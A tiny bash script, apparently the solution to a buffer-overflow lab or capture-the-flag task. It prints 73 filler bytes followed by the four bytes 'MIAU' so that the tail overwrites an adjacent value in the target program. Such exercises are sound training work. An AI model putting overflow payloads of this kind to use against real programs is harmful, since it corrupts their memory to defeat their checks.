#!/usr/bin/env bash

function repeat {
    for i in `seq $1`; do
        echo -n -e "$2"
    done
}

repeat 73 "\x01"
repeat 1 "\x4d\x49\x41\x55"
